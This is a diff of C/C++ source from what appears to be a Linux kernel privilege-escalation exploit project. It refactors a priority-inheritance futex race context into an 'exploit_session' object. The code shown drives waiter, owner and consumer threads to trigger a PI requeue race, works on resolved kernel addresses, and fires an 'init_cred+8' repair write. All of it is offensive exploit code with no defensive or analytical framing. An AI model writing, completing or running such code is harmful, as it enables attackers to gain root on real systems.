@@ -9,6 +9,7 @@
 #include "routes/route_controller.h"
 #include "profile.h"
 #include "session/handoff_probe.hpp"
+#include "session/exploit_session.hpp"
 #include "session/victim_context.hpp"
 #include "support/native_resource.hpp"
 #include <array>
@@ -448,11 +449,11 @@ void *consumer_thread(void *arg) {
 /* Decoupling plan: reset one PI race attempt. Input/output: PiRaceContext;
  * output: initialized synchronization state; lifecycle lives in PiRace::reset(). */
 void reset_main_route_state(void) {
-    int fast_repair = atomic_load(&g_pi_race_context.fast_repair);
-    g_pi_race_context.reset(
+    int fast_repair = atomic_load(&ghostlock::g_exploit_session.race.fast_repair);
+    ghostlock::g_exploit_session.race.reset(
             fast_repair ? 5000 : (int) execution_settings()->select_enter_delay_us,
             runtime_config_snapshot().main_cpu, runtime_config_snapshot().consumer_cpu);
-    atomic_store(&g_pi_race_context.fast_repair, fast_repair);
+    atomic_store(&ghostlock::g_exploit_session.race.fast_repair, fast_repair);
 }
 
 /* Wait for the parked waiter/owner pair, trigger the PI requeue and return the
@@ -491,10 +492,10 @@ RouteStatus ghostlock::PiRace::run() noexcept {
 int run_main_route_threads(const WriteRequest *request) {
     reset_main_route_state();
     pr_info("[route] creating waiter/owner/consumer\n");
-    int error = g_pi_race_context.start_threads(
+    int error = ghostlock::g_exploit_session.race.start_threads(
             waiter_thread, owner_thread, consumer_thread, request);
     if (error) {
-        g_pi_race_context.route_status = (RouteStatus) {
+        ghostlock::g_exploit_session.race.route_status = (RouteStatus) {
                 .code = ROUTE_DIRTY_FAILURE,
                 .step = 20,
                 .error_number = error,
@@ -502,9 +503,9 @@ int run_main_route_threads(const WriteRequest *request) {
         pr_warning("PI race thread creation failed errno=%d\n", error);
         return 0;
     }
-    RouteStatus status = g_pi_race_context.run();
-    g_pi_race_context.request_stop();
-    g_pi_race_context.join();
+    RouteStatus status = ghostlock::g_exploit_session.race.run();
+    ghostlock::g_exploit_session.race.request_stop();
+    ghostlock::g_exploit_session.race.join();
     pr_info("[route] threads joined\n");
     return status.code == ROUTE_OK;
 }
@@ -1218,9 +1219,9 @@ static int retry_write_stage(
                                 &g_resolved_addresses)) + 8,
                     WriteMode::Zero, 1);
             pr_info("W2b: firing prebuilt init_cred+8 repair\n");
-            atomic_store(&g_pi_race_context.fast_repair, 1);
+            atomic_store(&ghostlock::g_exploit_session.race.fast_repair, 1);
             int repaired = run_main_route_threads(&repair_request);
-            atomic_store(&g_pi_race_context.fast_repair, 0);
+            atomic_store(&ghostlock::g_exploit_session.race.fast_repair, 0);
             if (!repaired) {
                 pr_warning("W2 fast repair route failed\n");
                 return 0;
